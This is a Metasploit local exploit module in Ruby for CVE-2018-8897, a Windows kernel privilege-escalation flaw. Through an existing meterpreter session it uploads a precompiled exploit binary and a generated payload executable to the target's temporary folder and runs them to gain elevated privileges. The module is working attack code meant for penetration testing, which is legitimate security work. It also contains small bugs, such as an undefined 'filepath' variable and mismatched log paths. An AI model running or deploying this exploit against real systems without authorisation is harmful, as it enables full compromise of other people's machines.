##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Kernel Elevation of Privilege Vulnerability',
      'Description'    => %q{
        This module will upload a precompiled binary that uses CVE-2018-8897
        to elevate a second binary's privs.)
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Can Bölük <can1357>',  # PoC
          'bwatters-r7'           # msf module
        ],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter' ],
      'Targets'        => [ [ 'Windows', {} ] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => "May 08 2018",
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => 'False'
        }
    ))

    register_options([
      OptString.new('EXPLOIT_NAME',
        [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
      OptString.new('PAYLOAD_NAME',
        [false, 'The filename for the payload to be used on the target host (%RAND%.exe by default).', nil]),
      OptString.new('PATH',
        [false, 'Path to write binaries (%TEMP% by default).', nil])
    ])

  end

  # Exploit method for when exploit command is issued
  def exploit
    # Define default values
    exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha((rand(8)+6))
    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(8)+6))

    exploit_name = exploit_name + '.exe' if exploit_name[-4,4] != '.exe'
    payload_name = payload_name + '.exe' if payload_name[-4,4] != '.exe'

    # Connect to the session
    begin
      host = session.session_host
      print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
    rescue => e
      print_error("Could not connect to session: #{e}")
      return nil
    end

    # Generate the exe payload
    vprint_status("Generating EXE payload (#{payload_name})")
    payload_exe = generate_payload_exe
  # Writes script to target host and returns the pathname of the target file or nil if the
  # file could not be written.
    temppath = datastore['PATH'] || session.sys.config.getenv('TEMP')
    payload_path = temppath + "\\" + payload_name
    exploit_path = temppath + "\\" + exploit_name

    unless directory?(temppath)
      print_error("#{temppath} does not exists on the target")
      return nil
    end

    if file?(exploit_path)
      print_warning("#{payload_path} already exists on the target. Deleting...")
      begin
        file_rm(filepath)
        print_good("Deleted #{filepath}")
      rescue
        print_error("Unable to delete file!")
        return nil
      end
    end

    # UPLOAD EXPLOIT
    begin
      #data/exploits/cve-2018-8897-exe/cve-2018-8897-exe.exe
      local_exploit_path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2018-8897-exe', 'cve-2018-8897-exe.exe')
      print_status(local_exploit_path)
      upload_file(exploit_path, local_exploit_path)
      print_good("Payload uploaded on #{sysinfo['Computer']} to #{exploit_path}")

      # Escape windows pathname separators.
      #@clean_up_rc << "rm #{exploit_path.gsub(/\\/, '//')}\n"
    rescue => exception
      puts exception.backtrace
      print_error("Could not write the exploit on the target")
    end
    # UPLOAD PAYLOAD
    begin
      #data/exploits/cve-2018-8897-exe/cve-2018-8897-exe.exe
      print_status(payload_path)
      write_file(payload_path, payload_exe)
      print_good("Payload uploaded on #{sysinfo['Computer']} to #{exploit_path}")

      # Escape windows pathname separators.
      #@clean_up_rc << "rm #{payload_path.gsub(/\\/, '//')}\n"
    rescue => exception
      puts exception.backtrace
      print_error("Could not write the payload on the target")
    end
    
    # EXECUTE EXPLOIT
    sleep(3)
    begin
      print_status("Running exploit #{exploit_path} with payload #{payload_path}")
      output = cmd_exec("cmd.exe", "/c #{exploit_path} #{payload_path}")
      vprint_status(output)
    rescue
      print_error("Failed to execute payload on target")
      execsuccess = false
    end
  end
end
